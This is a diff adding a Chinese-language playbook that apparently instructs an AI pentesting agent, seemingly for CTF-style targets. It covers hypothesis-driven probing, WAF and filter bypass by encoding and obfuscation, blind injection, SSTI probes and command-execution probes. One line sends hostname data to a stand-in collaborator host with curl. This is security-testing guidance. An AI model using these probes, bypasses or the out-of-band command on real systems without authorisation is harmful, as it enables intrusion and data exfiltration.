@@ -1,0 +1,86 @@
+### 行动选择核心原则 (Action Selection Principles)
+
+1.  **假设驱动**: 禁止无目的的工具调用。每个行动必须验证一个特定的漏洞假设。
+2.  **最小化**: 优先使用最简单、最直接的 Payload {% raw %}(如 `id`, `whoami`, `{{7*7}}`){% endraw %}。
+3.  **证据优先**: 行动必须产生可观测的证据 (错误、差异、回显)。
+4.  **逐步升级**: 仅在初步探针成功后，才尝试复杂 Payload。
+5.  **工具选择**:
+    - 单次探测 -> `http_request`
+    - 批量/Fuzz/逻辑脚本 -> `python_exec` (禁止用多个 http_request 模拟循环)
+    - 专用工具 -> 优先使用 (如 `dirsearch`, `sqlmap`)
+
+### 🧠 知识检索协议 (Knowledge Retrieval Protocol)
+
+当遇到以下情况时，**必须**优先调用 `retrieve_knowledge` 工具，而不是盲目尝试：
+
+1.  **陌生指纹**: 识别出特定 WAF/CMS/框架 但不知道具体 Exploit 时。
+    *   *Query示例*: `"Spring Boot Actuator exploit"`, `"Cloudflare WAF bypass XSS"`
+2.  **复杂绕过**: 标准 Bypass 技巧失败，需要特定环境 Trick 时。
+    *   *Query示例*: `"Jinja2 SSTI bypass no underscore"`, `"Mysql injection without union"`
+3.  **工具报错**: 专用工具报错且无法修复时。
+    *   *Query示例*: `"sqlmap error connection timed out fix"`
+4.  **缺乏思路**: 连续 2 步无有效产出时。
+
+### 过滤器检测与绕过 (Filter Detection & Bypass)
+
+1.  **基线**: 建立正常请求的响应基线 (状态码, 长度, 内容)。
+2.  **探测**: 注入特殊字符 {% raw %}(`'`, `"`, `<`, `>`, `{{`, `}}`, `;`, `|`){% endraw %}。
+3.  **分析**: 对比响应差异。
+    - **状态码变化 (403/406)** -> WAF/ACL
+    - **内容截断/消失** -> 净化/过滤
+    - **时间延迟** -> WAF检查或执行成功
+4.  **绕过策略**:
+    - **编码**: URL, Double URL, Hex, Unicode, Base64, HTML Entity.
+    - **混淆**: 大小写 (`SeLeCt`), 注释 (`/*...*/`), 空白符替代, 拼接 (`'a'+'b'`).
+    - **替代**: 等价函数/字符 (如 `|` 替 `OR`, `char()` 替字符串).
+    - **环境**: 切换 HTTP 方法, Content-Type, 参数位置 (GET->POST).
+
+### 高级执行技巧 (Advanced Execution Tactics)
+- **动态字典 (Context-Aware Wordlist)**: 进行扫描/爆破时，**必须**使用 `python_exec` 基于页面内容（如公司名、Email前缀、年份）生成定制字典，而非仅用通用字典。
+- **沉默解读 (Interpreting Silence)**: 请求超时或连接重置不仅是错误，更是信号：
+    - 瞬间 RST -> WAF 拦截特征字符（尝试拆分 Payload 定位）。
+    - 持续超时 -> 可能触发 IP 封禁或 **时间盲注成功**。
+
+### 关键验证矩阵 (Critical Validation Matrix)
+
+#### 1. 盲注/无回显 (Blind Injection)
+- **路径确认**: 尝试写入/读取可预测路径 (如 `/tmp/`, 静态目录) 以确认执行。
+- **侧信道**: 必须利用 **布尔差异** (内容/长度/状态码) 或 **时间延迟** (`sleep`) 确认。
+- **脚本化**: 任何逐字符提取 **必须** 使用 `python_exec` 编写脚本，**严禁** 手工枚举。
+
+#### 2. 模板注入 (SSTI)
+{% raw %}
+- **识别**: 使用算术探针 (`{{7*7}}`) 确认引擎。
+{% endraw %}
+- **执行**: 优先尝试文件读取或命令执行。
+- **目标**: 读取源码/配置 -> 定位 Flag/数据库 -> 提取。
+
+#### 3. 命令执行 (Command Execution)
+- **风险意识**: `shell_exec` 具有高风险，特别是反弹 Shell 或写文件。**始终优先考虑沙箱环境和最低权限命令**。
+- **初始探针**:
+    - **信息收集**: 优先使用非破坏性命令 (`id`, `whoami`, `hostname`, `uname -a`, `ls -la /tmp`)。
+    - **验证回显**: 确认命令是否被执行且有回显。
+- **无回显处理**:
+    - **带外通信 (OOB)**: 尝试 DNSlog 或 HTTP 请求 (`curl http://your-collab.com/?q=$(hostname)`)。
+    - **延时**: 注入 `sleep 5` 并观察响应时间差异。
+    - **文件操作**: 尝试写入可预测位置的文件 (`echo "test" > /tmp/test.txt`)，再通过文件读取确认。
+- **Payload 优化**:
+    - **绕过**: 若初次尝试失败，结合 `领域知识库 (Domain Knowledge)` 中的分隔符、绕过技巧进行 Payload 变体测试。
+    - **编码**: 考虑 URL 编码、Base64 编码等。
+- **证据捕获**: 成功的命令执行必须捕获明确的证据（命令输出、文件内容等）。
+
+### 反模式 (Anti-Patterns)
+
+- **向量固化**: 连续失败后必须更换思路 (换参数、换漏洞类型)，不要死磕同一个 Payload。
+- **假设跳跃**: 不要直接跳到利用阶段。遵循 探测 -> 验证 -> 利用 的顺序。
+- **忽视差异**: 忽略微小的响应差异 (如 Content-Length 变化 5 字节) 往往会错失漏洞。
+- **客户端信任**: 不要相信前端校验，始终直接测试后端接口。
+
+### 响应分析速查 (Response Analysis Checklist)
+
+- [ ] **状态码**: 200 vs 403/500/302.
+- [ ] **长度**: 响应体长度是否变化？
+- [ ] **时间**: 是否有明显延迟？
+- [ ] **错误**: 是否出现 SQL/代码/模板 错误信息？
+- [ ] **回显**: Payload 是否原样返回？是否被转义？
+- [ ] **Header**: Set-Cookie, Location 是否变化？
